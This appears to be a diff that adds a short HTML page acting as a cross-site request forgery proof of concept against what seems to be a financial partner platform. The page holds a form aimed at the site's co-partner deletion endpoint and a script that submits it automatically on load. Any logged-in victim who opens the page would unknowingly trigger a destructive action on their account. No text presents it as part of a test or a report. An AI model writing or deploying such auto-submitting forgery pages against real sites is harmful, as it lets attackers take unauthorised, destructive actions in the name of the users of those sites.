@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Delete Co-Partner</title>
+</head>
+<body>
+
+  <form id="deleteCoPartnerForm" action="https://old.moneyplatform.biz/partner/deleteCoPartner/789.html?ajax=co-partner-grid" method="POST">
+    <!-- Add other form fields as needed -->
+    <!-- For example, if there are additional parameters, add them as hidden fields -->
+    
+    <!-- Add a submit button for user interaction -->
+    <button type="submit">Delete Co-Partner</button>
+  </form>
+
+  <!-- Use JavaScript to auto-submit the form -->
+  <script>
+    // Auto-submit the form when the page loads
+    document.getElementById('deleteCoPartnerForm').submit();
+  </script>
+
+</body>
+</html>
